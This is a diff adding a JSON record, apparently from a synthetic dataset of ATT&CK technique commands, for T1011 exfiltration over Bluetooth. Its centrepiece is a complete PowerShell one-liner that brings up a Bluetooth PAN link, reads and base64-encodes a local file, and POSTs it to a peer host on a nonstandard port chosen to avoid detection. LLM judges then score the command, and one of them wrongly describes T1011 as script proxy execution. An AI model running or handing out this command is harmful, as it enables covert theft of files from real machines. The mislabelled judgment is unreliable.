@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.27.45.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Pictures\\img1.png')); $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://172.27.45.1:52873/u' -Method POST -Body $body -UseBasicParsing -Headers @{ 'X-T'='b' } | Out-Null",
+  "explanation": "Uses Bluetooth PAN with a static IP and exfiltrates data via an HTTP POST to a custom port reachable only over the Bluetooth link (T1011).",
+  "rationale_steps": [
+    "Activate NAP over Bluetooth as the alternate network medium.",
+    "Assign a restricted /30 IP on the Bluetooth interface with netsh.",
+    "Use HTTP on a high, nonstandard port to minimize detection.",
+    "Ensure destination is on the Bluetooth-only subnet to force egress via Bluetooth."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-2f65f9a8",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax including variable assignments, pipeline operations, and proper method calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the claimed exfiltration technique by establishing a Bluetooth PAN connection with static IP addressing, then encoding a file as base64 and exfiltrating it via HTTP POST to a specific endpoint only accessible through the Bluetooth link.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T04:40:09.956682Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct PowerShell syntax for variable assignments, external command execution, cmdlet usage, and argument parsing.",
+        "semantic_score": 1,
+        "semantic_justification": "The command directly executes a binary and PowerShell cmdlets/utilities, entirely failing to demonstrate the System Script Proxy Execution (T1011) technique as claimed in the explanation, which involves abusing trusted system scripts.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T04:40:29.130439Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes, valid separators, and properly structured cmdlets, variables, and arguments.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly connects to a Bluetooth PAN, assigns a static IP, base64-encodes a file, and exfiltrates via HTTP POST to the peer, but static IP changes typically require admin rights and adapter discovery may return null, reducing reliability.",
+        "combined_score": 4.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T04:40:38.967737Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
